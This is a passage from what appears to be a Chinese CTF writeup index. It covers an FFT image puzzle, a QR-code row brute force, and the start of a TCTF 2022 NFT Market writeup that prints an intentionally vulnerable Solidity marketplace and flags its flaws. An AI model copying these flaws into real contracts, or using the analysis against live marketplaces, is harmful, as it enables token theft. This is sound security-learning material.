m, p = fft(img)\n    print(m.min(), m.max())\n\n    new_img1 = mapping(m)\n    new_img2 = mapping(p)\n\n    cv2.imwrite(f'cv1.png', new_img1)\n    cv2.imwrite(f'cv2.png', new_img2)\n</code></pre> <p>\u4e00\u4e2a FFT\uff0c\u76f4\u63a5\u628a\u4ee3\u7801\u9006\u56de\u53bb\u5c31\u597d\u4e86\uff1a <pre><code>import cv2\nimport numpy as np\n\ndef mapping(data, down=0, up=255, tp=np.uint8):\n    data_max = data.max()\n    data_min = data.min()\n    interval = data_max - data_min\n    new_interval = up - down\n    new_data = (data - data_min) * new_interval / interval + down\n    new_data = new_data.astype(tp)\n    return new_data\n\nif __name__ == '__main__':\n    img1 = cv2.imread(\"cv1.png\", cv2.IMREAD_GRAYSCALE)\n    img2 = cv2.imread(\"cv2.png\", cv2.IMREAD_GRAYSCALE)\n\n    m = mapping(img1, 0.8560967955058971, 17.682512473330895)\n    p = mapping(img2, 0, 2*np.pi)\n    res = m * (np.cos(p) + np.sin(p) * 1j)\n\n    ishift = np.fft.ifftshift(res)\n    iimg = np.fft.ifft2(ishift)\n    iimg = np.abs(iimg)\n    iimg = mapping(iimg)\n    cv2.imwrite(f'answer.png', iimg)\n</code></pre></p> flag: msc{The_master_of_cv} <p></p>"}, {"location": "writeups/sysu_msc_puzzle/#_23", "title": "\u6df7\u4e71\u7684\u4e8c\u7ef4\u7801", "text": "<p>\u4f60\u597d\uff01\u52c7\u58eb\uff0c\u4f60\u8d70\u5230\u8fd9\u91cc\u5df2\u7ecf\u8bc1\u660e\u4e86\u4f60\u7684\u5b9e\u529b\uff01 \u6211\u672c\u8be5\u7ed9\u4f60\u7684\u662f\u4e00\u5f20\u8bb0\u5f55\u7740\u7b54\u6848\u7684\u4e8c\u7ef4\u7801\uff0c\u4f46\u7531\u4e8e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6211\u4eec\u5fd8\u8bb0\u6807\u6ce8\u6bcf\u4e00\u884c\u7684\u987a\u5e8f\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u6536\u5230\u4e86\u8fd9\u6837\u7684\u6570\u636e\u2026\u2026\u52c7\u58eb\uff0c\u4f60\u80fd\u8fd8\u539f\u51fa\u5b83\u7684\u539f\u59cb\u6a21\u6837\u5417\uff1f</p> \u9898\u76ee <pre><code>[\n  \"10111010111000011000001011101\", \"00111010110010101000000000010\",\n  \"11100001101100100001011010110\", \"10000010000111101111111111101\",\n  \"10111010000010001000001011101\", \"01110011010111001001011100001\",\n  \"10101101110101001110000110010\", \"10111010111010111110001011101\",\n  \"10010100110101101111100111110\", \"10111110011101011000011010111\",\n  \"11001010001011011000000001000\", \"10111010100101100111111110100\",\n  \"10000010110010110100100011001\", \"11111110101010101010101111111\",\n  \"10111010001100010100110110111\", \"11111110101101010101110110000\",\n  \"00000000100100100101100011100\", \"00000000111001101011011111001\",\n  \"11111100100110010010001011110\", \"00010001110001001101110001010\",\n  \"10000010111110001101101000001\", \"11001110110110010101100100001\",\n  \"11011110111101111101111110100\", \"11111110100010100101101011100\",\n  \"00000000011111011001100000000\", \"10111010111001000110010100010\",\n  \"11111110101110011001001111111\", \"10000010001100011010101000001\",\n  \"10011111111101000101110010111\"\n]\n</code></pre> <p>\u628a\u8fd9\u4e9b\u503c\u8f93\u5165\u5230 csv \u4e2d\uff0c\u7136\u540e Excel \u6253\u5f00\uff0c\u8c03\u4e00\u8c03\u683c\u5f0f\uff0c\u5f00\u59cb\u6309\u7167\u4e8c\u7ef4\u7801\u7684\u89c4\u5219\uff08\u4e09\u4e2a\u5b9a\u4f4d\u70b9\uff0c\u5bf9\u9f50\u56fe\u6837\u3001\u65f6\u5e8f\u56fe\u6837\u7b49\uff09\u6765\u786e\u5b9a\u53ef\u4ee5\u786e\u5b9a\u7684\u884c\uff0c\u7ed3\u679c\uff1a  </p> <p>\u4e0a\u9762\u6709 2 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff0c\u4e2d\u95f4\u6709 11 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff08\u5176\u4e2d\u7531\u4e8e\u65f6\u5e8f\u56fe\u6837\u7684\u539f\u56e0\uff0c\u6240\u4ee5\u76f8\u5f53\u4e8e\u6709 5 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\u548c 6 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff09\uff0c\u6240\u4ee5\u603b\u5171\u6709 <code>2*5!*6! = 172800</code> \u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u53ef\u4ee5\u679a\u4e3e\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528 pyzbar \u8fd9\u4e2a\u5305\u6765\u81ea\u52a8\u89e3\u4e8c\u7ef4\u7801</p> <p>\u6539\u4e00\u6539 GZTime 2021 \u7965\u4e91\u676f\u7684 writeup \u91cc\u7684\u4ee3\u7801\uff1a</p> \u4ee3\u7801 <pre><code>data = [\n    \"11111110101110011001001111111\",\n    \"10000010111110001101101000001\",\n    \"10111010111010111110001011101\", # &lt;- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21\n    \"10111010000010001000001011101\",\n    \"10111010111000011000001011101\", # &lt;- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21\n    \"10000010001100011010101000001\",\n    \"11111110101010101010101111111\",\n    \"00000000011111011001100000000\",\n    \"10011111111101000101110010111\",\n    \"11100001101100100001011010110\",\n    \"00111010110010101000000000010\",\n    \"10101101110101001110000110010\",\n    \"01110011010111001001011100001\",\n    \"10010100110101101111100111110\", \n    \"10111110011101011000011010111\",\n    \"00000000111001101011011111001\",\n    \"11001010001011011000000001000\",\n    \"11111100100110010010001011110\",\n    \"11001110110110010101100100001\",\n    \"00010001110001001101110001010\",\n    \"11011110111101111101111110100\",\n    \"00000000100100100101100011100\",\n    \"11111110100010100101101011100\",\n    \"10000010110010110100100011001\",\n    \"10111010100101100111111110100\",\n    \"10111010111001000110010100010\",\n    \"10111010001100010100110110111\",\n    \"10000010000111101111111111101\",\n    \"11111110101101010101110110000\"\n]\n\nimport pyzbar.pyzbar as pyzbar\nfrom itertools import permutations\nfrom PIL import Image, ImageDraw as draw\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\n\nshuffle_1 = [9, 11, 13, 15, 17, 19]\nshuffle_2 = [10, 12, 14, 16, 18]\n\nhead = data[:9]\ntail = data[20:]\n\ndef body(body_1, body_2): # \u83b7\u53d6\u4e2d\u95f4\u90e8\u5206\u7684\u4e00\u79cd\u6392\u5217\n    body = []\n    for i in range(5):\n        body.append(body_1[i])\n        body.append(body_2[i])\n    body.append(body_1[5])\n    return [data[i] for i in body]\n\ndef draw_img(data): # \u751f\u6210\u4e8c\u7ef4\u7801\u56fe\u7247\n    assert len(data) == 29 and len(data[0]) == 29\n    img = Image.new('RGB', (31, 31), (255,255,255))\n    for i, row in enumerate(data):\n        for j, pixel in enumerate(row):\n            img.putpixel((j + 1, i + 1), (0,0,0) if pixel == \"1\" else (255,255,255))\n    return img\n\nwith tqdm(total=86400) as pbar:\n    for body_1 in permutations(shuffle_1):\n        for body_2 in permutations(shuffle_2):\n            im = draw_img(head + body(body_1, body_2) + tail)\n            barcodes = pyzbar.decode(im)\n            pbar.update(1)\n            if(len(barcodes) == 0):\n                continue\n\n            for barcode in barcodes:\n                barcodeData = barcode.data.decode(\"utf-8\")\n                print(barcodeData)\n                plt.imshow(im)\n                plt.show()\n</code></pre> <p>\u53ef\u4ee5\u8dd1\u51fa\u53ef\u89e3\u7684\u4e8c\u7ef4\u7801\u548c flag\uff1a</p> flag\uff1amsc{You_ar3_g0od_4t_QR_Code} <p></p>"}, {"location": "writeups/tctf2022/", "title": "TCTF/0CTF 2022 RisingStar Writeup", "text": "<p> \u7ea6 2519 \u4e2a\u5b57  323 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>TCTF/0CTF 2022 \u7684\u65b0\u661f\u8d5b\u9053\u548c\u56fd\u9645\u8d5b\u9053\uff0cmisc \u9898\u6709\u56db\u9053\u662f\u540c\u4e00\u4e2a\u9644\u4ef6\u7684\u56db\u4e2a flag\uff0c\u5f88 reverse\uff0c\u6ca1\u600e\u4e48\u505a\u3002\u53ea\u548c\u56db\u8001\u5e08\u4e00\u8d77\u505a\u4e86 ETH \u7684\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u6709\u8da3\u7684</p>"}, {"location": "writeups/tctf2022/#tctf-nft-market", "title": "TCTF NFT Market", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.15;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n\ncontract TctfNFT is ERC721, Ownable {\n    constructor() ERC721(\"TctfNFT\", \"TNFT\") {\n        _setApprovalForAll(address(this), msg.sender, true);\n    }\n\n    function mint(address to, uint256 tokenId) external onlyOwner {\n        _mint(to, tokenId);\n    }\n}\n\ncontract TctfToken is ERC20 {\n    bool airdropped;\n\n    constructor() ERC20(\"TctfToken\", \"TTK\") {\n        _mint(address(this), 100000000000);\n        _mint(msg.sender, 1337);\n    }\n\n    function airdrop() external {\n        require(!airdropped, \"Already airdropped\");\n        airdropped = true;\n        _mint(msg.sender, 5);\n    }\n}\n\nstruct Order {\n    address nftAddress;\n    uint256 tokenId;\n    uint256 price;\n}\nstruct Coupon {\n    uint256 orderId;\n    uint256 newprice;\n    address issuer;\n    address user;\n    bytes reason;\n}\nstruct Signature {\n    uint8 v;\n    bytes32[2] rs;\n}\nstruct SignedCoupon {\n    Coupon coupon;\n    Signature signature;\n}\n\ncontract TctfMarket {\n    event SendFlag();\n    event NFTListed(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n\n    event NFTCanceled(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId\n    );\n\n    event NFTBought(\n        address indexed buyer,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n\n    bool tested;\n    TctfNFT public tctfNFT;\n    TctfToken public tctfToken;\n    CouponVerifierBeta public verifier;\n    Order[] orders;\n\n    constructor() {\n        tctfToken = new TctfToken();\n        tctfToken.approve(address(this), type(uint256).max);\n\n        tctfNFT = new TctfNFT();\n        tctfNFT.mint(address(tctfNFT), 1);\n        tctfNFT.mint(address(this), 2);\n        tctfNFT.mint(address(this), 3);\n\n        verifier = new CouponVerifierBeta();\n\n        orders.push(Order(address(tctfNFT), 1, 1));\n        orders.push(Order(address(tctfNFT), 2, 1337));\n        orders.push(Order(address(tctfNFT), 3, 13333333337));\n    }\n\n    function getOrder(uint256 orderId) public view returns (Order memory order) {\n        require(orderId &lt; orders.length, \"Invalid orderId\");\n        order = orders[orderId];\n    }\n\n    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {\n        require(price &gt; 0, \"Invalid price\");\n        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), \"Not owner\");\n        orders.push(Order(nftAddress, tokenId, price));\n        emit NFTListed(msg.sender, nftAddress, tokenId, price);\n        return orders.length - 1;\n    }\n\n    function cancelOrder(uint256 orderId) external {\n        Order memory order = getOrder(orderId);\n        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), \"Not owner\");\n        _deleteOrder(orderId);\n        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);\n    }\n\n    function purchaseOrder(uint256 orderId) external {\n        Order memory order = getOrder(orderId);\n        _deleteOrder(orderId);\n        IERC721 nft = IERC721(order.nftAddress);\n        address owner = nft.ownerOf(order.tokenId);\n        tctfToken.transferFrom(msg.sender, owner, order.price);\n        nft.safeTransferFrom(owner, msg.sender, order.tokenId);\n        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);\n    }\n\n    function purchaseWithCoupon(SignedCoupon calldata scoupon) external {\n        Coupon memory coupon = scoupon.coupon;\n        require(coupon.user == msg.sender, \"Invalid user\");\n        require(coupon.newprice &gt; 0, \"Invalid price\");\n        verifier.verifyCoupon(scoupon);\n        Order memory order = getOrder(coupon.orderId);\n        _deleteOrder(coupon.orderId);\n        IERC721 nft = IERC721(order.nftAddress);\n        address owner = nft.ownerOf(order.tokenId);\n        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);\n        nft.safeTransferFrom(owner, coupon.user, order.tokenId);\n        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);\n    }\n\n    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {\n        require(!tested, \"Tested\");\n        tested = true;\n        IERC721 nft = IERC721(nftAddress);\n        uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);\n        nft.approve(address(this), tokenId);\n        TctfMarket(this).purchaseOrder(orderId);\n    }\n\n    function win() external {\n        require(tctfNFT.ownerOf(1) == msg.sender &amp;&amp; tctfNFT.ownerOf(2) == msg.sender &amp;&amp; tctfNFT.ownerOf(3) == msg.sender);\n        emit SendFlag();\n    }\n\n    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {\n        IERC721 nft = IERC721(nftAddress);\n        address owner = nft.ownerOf(tokenId);\n        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);\n    }\n\n    function _deleteOrder(uint256 orderId) internal {\n        orders[orderId] = orders[orders.length - 1];\n        orders.pop();\n    }\n\n    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract CouponVerifierBeta {\n    TctfMarket market;\n    bool tested;\n\n    constructor() {\n        market = TctfMarket(msg.sender);\n    }\n\n    function verifyCoupon(SignedCoupon calldata scoupon) public {\n        require(!tested, \"Tested\");\n        tested = true;\n        Coupon memory coupon = scoupon.coupon;\n        Signature memory sig = scoupon.signature;\n        Order memory order = market.getOrder(coupon.orderId);\n        bytes memory serialized = abi.encode(\n            \"I, the issuer\", coupon.issuer,\n            \"offer a special discount for\", coupon.user,\n            \"to buy\", order, \"at\", coupon.newprice,\n            \"because\", coupon.reason\n        );\n        IERC721 nft = IERC721(order.nftAddress);\n        address owner = nft.ownerOf(order.tokenId);\n        require(coupon.issuer == owner, \"Invalid issuer\");\n        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, \"Invalid signature\");\n    }\n}\n</code></pre> <p>\u5408\u7ea6\u5f88\u590d\u6742\uff0c\u4e0b\u9762\u8be6\u7ec6\u5206\u6790\u4e00\u4e0b\uff1a</p> <ul> <li>\u6709\u4e00\u4e2a\u57fa\u4e8e ERC20 \u7684\u4ee3\u5e01 TctfToken\uff08TTK\uff09<ul> <li>\u5728\u521b\u5efa\u65f6\u4f1a\u7ed9\u81ea\u5df1\u5408\u7ea6\u53d1\u653e 100000000000 \u4e2a\u4ee3\u5e01\uff0c\u7ed9\u90e8\u7f72\u8005\u53d1\u653e 1337 \u4e2a\u4ee3\u5e01</li> <li>\u6709\u7a7a\u6295\u65b9\u6cd5\uff0c\u5916\u90e8\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\uff0c\u4e0d\u8fc7\u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff0c\u4e14\u4e00\u6b21\u53ea\u80fd\u83b7\u5f97 5 \u4e2a\u4ee3\u5e01</li> </ul> </li> <li>\u6709\u4e00\u4e2a\u57fa\u4e8e ERC721 \u7684\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff08NFT\uff09TctfNFT<ul> <li>NFT \u7684\u5b9e\u8d28\u5c31\u662f\u53ef\u4ee5\u4e0b\u53d1\u5f88\u591a\u79cd\u4ee3\u5e01\uff08tokenId\uff09\uff0c\u4e0d\u8fc7\u6bcf\u79cd\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u56e0\u6b64\u5728 mint \u7684\u65f6\u5019\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4ee3\u8868\u7684\u662f\u7f16\u53f7\u800c\u4e0d\u662f ERC20 \u4e2d\u7684\u6570\u91cf</li> <li>\u53ea\u6709 owner \u53ef\u4ee5\u4e0b\u53d1\u65b0\u4ee3\u5e01</li> </ul> </li> <li>\u6709\u4e00\u4e9b\u7ed3\u6784\u4f53<ul> <li>Order\uff1a\u4fdd\u5b58\u4e86\u8ba2\u5355\u4fe1\u606f\uff0c\u5305\u542b NFT \u5408\u7ea6\u5730\u5740\u3001\u552e\u5356\u7684\u4ee3\u5e01 id\u3001\u552e\u5356\u7684\u4ef7\u683c</li> <li>Coupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\uff0c\u5305\u542b\u4e86\u8ba2\u5355\u7f16\u53f7\u3001\u4f18\u60e0\u540e\u7684\u4ef7\u683c\u3001\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f7f\u7528\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f18\u60e0\u7406\u7531<ul> <li>\u26a0\ufe0f \u8fd9\u91cc\u6709\u4e00\u4e2a\u53ef\u7591\u7684\u5730\u65b9\uff0c\u5b83\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\u800c\u4e0d\u662f\u4ee3\u5e01\u7f16\u53f7\uff0c\u4f1a\u51fa\u73b0\u95ee\u9898</li> </ul> </li> <li>Signature\uff1a\u4fdd\u5b58\u4e86\u7b7e\u540d\u4fe1\u606f\uff08web3 \u7b7e\u540d\u5f97\u5230\u7684 v\u3001r\u3001s\uff09</li> <li>SignedCoupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\u548c\u5bf9\u5e94\u7684\u7b7e\u540d</li> </ul> </li> <li>\u6709\u4e00\u4e2a\u4ea4\u6613\u5546\u573a\u5408\u7ea6 TctfMarket<ul> <li>\u6784\u9020\u65b9\u6cd5\uff1a<ul> <li>\u5148\u521b\u5efa\u4e00\u4e2a TctfToken \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u5141\u8bb8\u5f53\u524d\u5546\u573a\u5408\u7ea6\u4efb\u610f\u4f7f\u7528\u6240\u62e5\u6709\u7684\u4ee3\u5e01<ul> <li>\u5f53\u524d\u5546\u573a\u56e0\u4e3a\u90e8\u7f72\u4e86\u5408\u7ea6\u4f1a\u88ab\u5206\u5230 1337 TTK</li> </ul> </li> <li>\u7136\u540e\u521b\u5efa\u4e00\u4e2a TctfNFT \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u4e0b\u53d1\u4e09\u4e2a NFT \u4ee3\u5e01\uff1a<ul> <li>1 \u53f7 NFT \u53d1\u653e\u7ed9 TctfNFT \u5408\u7ea6\u8d26\u6237</li> <li>2 \u53f7\u30013 \u53f7 NFT \u53d1\u653e\u7ed9\u5f53\u524d\u5546\u573a\u8d26\u6237</li> </ul> </li> <li>\u521b\u5efa\u4e00\u4e2a verifier\uff08\u540e\u9762\u518d\u5206\u6790\uff09</li> <li>\u521b\u5efa\u4e09\u4e2a\u8ba2\u5355\uff1a<ul> <li>1 \u53f7\u4ee3\u5e01\u4ee5 1 TTK \u7684\u4ef7\u683c\u552e\u5356\uff08airdrop \u4e4b\u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70\uff09</li> <li>2 \u53f7\u4ee3\u5e01\u4ee5 1337 TTK \u7684\u4ef7\u683c\u552e\u5356<ul> <li>\u26a0\ufe0f \u7ed3\u5408\u524d\u9762\u5546\u573a\u5f97\u5230\u4e86 1337 TTK \u7684\u6697\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u4ee3\u5e01\u9700\u8981\u5148\u9a97\u53d6\u5546\u573a\u7684\u94b1</li> </ul> </li> <li>3 \u53f7\u4ee3\u5e01\u4ee5 13333333337 TTK \u7684\u4ef7\u683c\u552e\u5356<ul> <li>\u26a0\ufe0f \u4ef7\u683c\u5f88\u9ad8\uff0c\u6240\u4ee5\u53ef\u4ee5\u731c\u5230\u9700\u8981\u4f7f\u7528\u4f18\u60e0\u5238\u6765\u964d\u4f4e\u4ef7\u683c</li> </ul> </li> </ul> </li> </ul> </li> <li>\u901a\u8fc7\u65b9\u6cd5\uff1a<ul> <li>win \u65b9\u6cd5\u4e2d\u5b9a\u4e49\uff08\u672b\u5c3e emit \u4e86 SendFlag \u4e8b\u4ef6\uff09</li> <li>\u68c0\u67e5\u8c03\u7528\u8005\u662f\u5426\u62e5\u6709\u5168\u90e8\u4e09\u4e2a\u4ee3\u5e01\uff0c\u5982\u679c\u6709\u5219\u6210\u529f</li> </ul> </li> <li>getOrder \u65b9\u6cd5\uff1a\u83b7\u53d6\u8ba2\u5355\uff0c\u4e0d\u5fc5\u591a\u8bf4</li> <li>createOrder \u65b9\u6cd5<ul> <li>\u63a5\u6536\u4e00\u4e2a NFT \u5408\u7ea6\u8d26\u6237\u5730\u5740\uff0c\u552e\u5356\u7684 tokenId \u548c\u4ef7\u683c</li> <li>\u521b\u5efa\u8ba2\u5355\u7684\u8d26\u6237\uff08\u5373\u8c03\u7528\u6b64\u65b9\u6cd5\u7684\u8d26\u6237\uff09\u5fc5\u987b\u662f\u6240\u552e\u5356\u4ee3\u5e01\u7684 owner\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u6b64\u4ee3\u5e01\u7684\u6743\u9650\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u4ed6\u6240\u6709\u4ee3\u5e01\u7684\u6743\u9650\uff08\u5728 isNFTApprovedOrOwner \u65b9\u6cd5\u4e2d\u68c0\u67e5\uff09</li> <li>\u26a0\ufe0f \u6b64\u5904\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u521b\u5efa\u8ba2\u5355\u7684 NFT \u5408\u7ea6\u5730\u5740\u5e76\u6ca1\u6709\u786c\u7f16\u7801\u4e3a\u5546\u573a\u521b\u5efa\u7684 NFT \u5730\u5740\uff0c\u800c\u662f\u53ef\u4ee5\u901a\u8fc7\u7528\u6237\u81ea\u884c\u8f93\u5165\uff0c\u4f1a\u6709\u95ee\u9898</li> <li>\u26a0\ufe0f \u6b64\u5904\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f external \u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5916\u90e8\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u521b\u5efa\u8ba2\u5355</li> </ul> </li> <li>cancelOrder \u65b9\u6cd5<ul> <li>\u548c createOrder \u65b9\u6cd5\u540c\u6837\u68c0\u67e5\u4e86\u6743\u9650</li> <li>\u8c03\u7528\u4e86 internal \u7684 _deleteOrder \u65b9\u6cd5\uff1a<ul> <li>\u5c06\u672b\u5c3e\u7684\u8ba2\u5355\u79fb\u52a8\u5230\u5f53\u524d\u8981\u5220\u9664\u7684\u4f4d\u7f6e\u7136\u540e\u5f39\u51fa\u672b\u5c3e\u8ba2\u5355</li> <li>\u26a0\ufe0f \u8fd9\u91cc\u4f1a\u5bfc\u81f4\u8ba2\u5355\u987a\u5e8f\u4e71\u5e8f\uff0c\u7ed3\u5408\u524d\u9762\u4f18\u60e0\u5238\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\uff0c\u4f1a\u5bfc\u81f4\u4f18\u60e0\u5238\u5b9e\u9645\u4f5c\u7528\u4ee3\u5e01\u53d1\u751f\u53d8\u5316\uff0c\u662f\u4e2a\u5927\u95ee\u9898</li> </ul> </li> </ul> </li> <li>\u6709\u4e09\u79cd\u652f\u4ed8\u8ba2\u5355\uff08\u8d2d\u4e70\u4ee3\u5e01\uff09\u7684\u65b9\u6cd5\uff1a<ul> <li>purchaseOrder \u539f\u4ef7\u8d2d\u4e70\uff1a<ul> <li>\u53ef\u4ee5\u8c03\u7528\u65e0\u9650\u6b21</li> <li>\u76f4\u63a5\u652f\u4ed8\uff0c\u5148\u5220\u9664\u8ba2\u5355\u9632\u6b62\u91cd\u5165</li> <li>\u5148\u4ece\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09\u8f6c order.price \u4e2a TTK \u7ed9\u4ee3\u5e01\u6240\u6709\u8005<ul> <li>\u26a0\ufe0f \u8fd9\u91cc\u4e5f\u6709\u95ee\u9898\uff0cToken \u7684\u63a5\u6536\u65b9\u53ea\u4f1a\u662f owner\uff0c\u800c\u4e0d\u4f1a\u662f\u5176\u5b83\u88ab approved \u7684\u8d26\u6237\uff08\u6bd4\u5982\u8ba2\u5355\u521b\u5efa\u8005\uff09</li> </ul> </li> <li>\u518d\u4ece\u4ee3\u5e01\u6240\u6709\u8005\u8f6c\u51fa\u8fd9\u4e2a\u4ee3\u5e01\uff08order.tokenId\uff09\u7ed9\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09</li> </ul> </li> <li>purchaseTest\uff1a<ul> <li>\u53ea\u80fd\u8c03\u7528\u4e00\u6b21</li> <li>\u26a0\ufe0f \u770b\u540d\u5b57\u662f\u6d4b\u8bd5\u7528\u65b9\u6cd5\uff0c\u5f88\u53ef\u7591\uff0c\u5e94\u8be5\u4f1a\u5305\u542b\u6f0f\u6d1e</li> <li>\u5177\u4f53\u903b\u8f91\u548c purchaseOrder \u5dee\u4e0d\u591a</li> <li>\u8c03\u7528\u8005\u53ef\u4ee5\u6307\u5b9a NFT \u5408\u7ea6\u5730\u5740\u3001tokenId \u548c\u4ef7\u683c</li> <li>\u5148\u521b\u5efa\u8ba2\u5355\u7136\u540e\u8df3\u7528 purchaseOrder \u8d2d\u4e70</li> </ul> </li> <li>purchaseWithCoupon \u4f7f\u7528\u4f18\u60e0\u5238\u8d2d\u4e70\uff1a<ul> <li>\u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff08CouponVerifierBeta \u7684\u539f\u56e0\uff09</li> <li>\u4f20\u5165\u4e00\u4e2a SignedCoupon</li> <li>\u901a\u8fc7 verifier.verifyCoupon \u9a8c\u8bc1\u6743\u9650\u548c\u7b7e\u540d</li> <li>\u901a\u8fc7 coupon.orderId \u53d6\u51fa\u8ba2\u5355\u5e76\u5220\u9664<ul> <li>\u26a0\ufe0f \u8fd9\u91cc\u6709\u95ee\u9898\uff0c\u53d6\u51fa\u8ba2\u5355\u7684\u64cd\u4f5c\u5728\u9a8c\u8bc1\u4e4b\u540e\uff0c\u5982\u679c\u80fd\u591f\u5728\u9a8c\u8bc1\u65f6\u641e\u4e9b\u624b\u6bb5\u5219\u53ef\u4ee5\u8ba9\u540e\u9762\u83b7\u5f97\u7684\u8ba2\u5355\u662f\u53e6\u4e00\u4e2a\u8ba2\u5355</li> </ul> </li> <li>\u4ee5 purchaseOrder \u540c\u6837\u903b\u8f91\u552e\u5356\uff08\u4ee5 coupon.newprice \u4ef7\u683c\uff09</li> </ul> </li> </ul> </li> <li>onERC721Received \u65b9\u6cd5\uff1a<ul> <li>\u9700\u8981\u8fd4\u56de selector \u6765\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u53ef\u7591\u63a5\u6536 ERC721 \u4ee3\u5e01\u7684\u5408\u7ea6\u8d26\u6237\uff08\u5728 safeTransferFrom \u65f6\u8c03\u7528\u68c0\u67e5\uff09</li> <li>\u66fe\u7ecf\u6709\u6f0f\u6d1e\u662f\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u7684\u7279\u6027\u6765\u5728\u91cc\u9762\u641e\u5c0f\u52a8\u4f5c\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u8fc7\u672c\u5408\u7ea6\u5df2\u7ecf\u9632\u6b62\u4e86\u91cd\u5165</li> </ul> </li> </ul> </li> <li>\u6709\u4e00\u4e2a\u4f18\u60e0\u5238\u7b7e\u540d\u9a8c\u8bc1\u5408\u7ea6 CouponVerifierBeta\uff1a<ul> <li>\u26a0\ufe0f \u540c\u6837\u540d\u5b57\u91cc\u5e26\u4e86 Beta\uff0c\u5f88\u53ef\u7591</li> <li>verifyCoupon \u65b9\u6cd5\uff1a<ul> <li>\u53ea\u80fd\u8c03\u7528\u4e00\u6b21</li> <li>\u63a5\u6536\u4e00\u4e2a SignedCoupon</li> <li>\u53d6\u51fa coupon\u3001\u7b7e\u540d\u3001\u8ba2\u5355</li> <li>\u6784\u9020 serialized bytes \u4fe1\u606f</li> <li>\u9a8c\u8bc1 issuer \u662f\u5426\u662f\u6240\u4f18\u60e0\u7684\u4ee3\u5e01\u7684 owner<ul> <li>\u26a0\ufe0f \u6b64\u5904\u6709\u95ee\u9898\uff0c\u8c03\u7528\u4e86 NFT \u5730\u5740\u4e0a\u7684 ownerOf \u65b9\u6cd5\uff0c\u4e0d\u8fc7\u8fd9\u4e2a NFT \u5730\u5740\u53ef\u4ee5\u662f\u7528\u6237\u81ea\u884c\u521b\u5efa\u8ba2\u5355\u65f6\u6307\u5b9a\u7684\uff0c\u5176 ownerOf \u65b9\u6cd5\u4e5f\u5e76\u4e0d\u53ef\u4fe1</li> </ul> </li> <li>\u9a8c\u8bc1\u9488\u5bf9 keccak256(serialized) \u7684\u7b7e\u540d sig \u662f\u5426\u662f issuer 